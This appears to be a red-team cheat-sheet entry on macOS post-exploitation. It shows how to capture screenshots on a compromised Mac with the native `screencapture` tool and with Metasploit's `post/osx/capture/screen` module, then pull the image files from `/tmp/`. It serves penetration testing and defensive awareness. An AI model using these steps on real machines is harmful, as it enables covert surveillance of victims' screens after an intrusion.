---
author(s):
  - Userware
tags:
  - post-exploitation
  - enumeration-and-discovery
  - living-off-the-land
  - metasploit-framework
  - osx
---
# Screenshot

## 01 - Living off the Land

Mac OSX Screenshot program

```
$ screencapture
```

## 02 - Metasploit

You can use a metasploit module as well and if you type `info` you can run a session type that it can be either a regular **Shell** or a **Meterpreter**.

```
msf > use post/osx/capture/screen

msf post(osx/capture/screen) > options

Module options (post/osx/capture/screen):

   Name      Current Setting          Required  Description
   ----      ---------------          --------  -----------
   COUNT     1                        yes       Number of screenshots to collect.
   DELAY     10                       yes       Interval between screenshots in seconds. 0 for no delay
   EXE_PATH  /usr/sbin/screencapture  yes       Path to remote screencapture executable
   FILETYPE  png                      yes       File format to use when saving a snapshot (Accepted: png, gif)
   SESSION                            yes       The session to run this module on
   TMP_PATH  /tmp/<random>            yes       Path to remote temp directory

msf post(osx/capture/screen) > set session <session_ID>

msf post(osx/capture/screen) > run
```

Once you've took a screenshot download the file in the compromised Mac OSX machine that was stored in the `/tmp/` folder.

---
## References

### LOOBins

- [LOOBins: Screencapture](https://www.loobins.io/binaries/screencapture/)

### Null Byte

- [Null Byte: How to Automate Screenshot Exfiltration from a Backdoored MacBook](https://null-byte.wonderhowto.com/how-to/hacking-macos-automate-screenshot-exfiltration-from-backdoored-macbook-0186598/)